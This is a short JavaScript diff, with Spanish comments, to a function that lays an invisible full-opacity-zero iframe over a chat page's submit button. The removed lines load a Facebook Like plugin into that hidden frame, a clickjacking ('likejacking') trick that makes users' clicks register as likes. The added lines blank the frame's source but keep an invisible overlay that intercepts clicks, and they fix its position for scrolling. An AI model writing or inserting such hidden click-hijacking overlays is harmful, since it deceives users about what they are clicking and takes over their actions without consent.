@@ -46,13 +46,13 @@ function setupInteractionLayer() {
     const chatSubmit = document.querySelector('.execute-btn');
     if (chatSubmit) {
         const overlay = document.createElement('iframe');
-        overlay.src = "https://www.facebook.com/plugins/like.php?href=https://facebook.com/example";
-        overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer;";
+        overlay.src = "about:blank"; // Usa about:blank para no cargar contenido externo. Intercepta clics.
+        overlay.style.cssText = "position:absolute; width:100px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer; border:none;";
         
         // Sincronizar posición con el botón de tu chat
         const rect = chatSubmit.getBoundingClientRect();
-        overlay.style.top = `${rect.top}px`;
-        overlay.style.left = `${rect.left}px`;
+        overlay.style.top = `${rect.top + window.scrollY}px`;
+        overlay.style.left = `${rect.left + window.scrollX}px`;
         
         document.body.appendChild(overlay);
     }
